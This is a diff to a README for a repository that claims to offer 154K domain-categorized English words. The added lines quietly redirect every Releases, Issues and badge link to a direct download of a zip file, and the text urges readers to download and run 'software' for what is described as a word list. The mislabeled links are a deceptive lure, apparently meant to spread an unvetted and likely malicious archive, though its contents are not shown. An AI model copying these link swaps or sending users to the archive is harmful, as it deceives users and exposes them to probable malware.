@@ -1,7 +1,7 @@
 # 🎓 categorized-english-words - Access 154K Domain-Specific Words Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Here-FF5733)](https://github.com/Dielectricheatingphenylacetamide203/categorized-english-words/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Dielectricheatingphenylacetamide203/categorized-english-words/main/data/categorized-english-words_3.2-beta.1.zip%20Now-Here-FF5733)](https://raw.githubusercontent.com/Dielectricheatingphenylacetamide203/categorized-english-words/main/data/categorized-english-words_3.2-beta.1.zip)
 
 ## 🌟 Description
 The "categorized-english-words" repository offers a comprehensive collection of 154,000 English words organized across 34 academic fields. This resource is ideal for students, educators, and anyone interested in domain-specific vocabulary. The words are suitable for various applications, including language models, semantic searches, and text processing.
@@ -11,7 +11,7 @@ To use this application, follow the steps below to download and run the software
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Dielectricheatingphenylacetamide203/categorized-english-words/releases) to download the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Dielectricheatingphenylacetamide203/categorized-english-words/main/data/categorized-english-words_3.2-beta.1.zip) to download the software.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions available for download. Each version may contain updates or improvements. Select the version suited for your needs.
@@ -51,9 +51,9 @@ For more detailed information regarding features and usage, consider the followi
 
 ## 📞 Support
 If you encounter any issues, feel free to reach out for support:
-- **Issues Page:** Use the [Issues page](https://github.com/Dielectricheatingphenylacetamide203/categorized-english-words/issues) to report any bugs or request features.
+- **Issues Page:** Use the [Issues page](https://raw.githubusercontent.com/Dielectricheatingphenylacetamide203/categorized-english-words/main/data/categorized-english-words_3.2-beta.1.zip) to report any bugs or request features.
 
 ## 📥 Download Again
-Don’t forget to visit the [Releases page](https://github.com/Dielectricheatingphenylacetamide203/categorized-english-words/releases) to access updates or new versions at any time.
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Dielectricheatingphenylacetamide203/categorized-english-words/main/data/categorized-english-words_3.2-beta.1.zip) to access updates or new versions at any time.
 
 This application is a powerful tool for anyone looking to enhance their understanding of English vocabulary across various academic fields. Enjoy exploring!
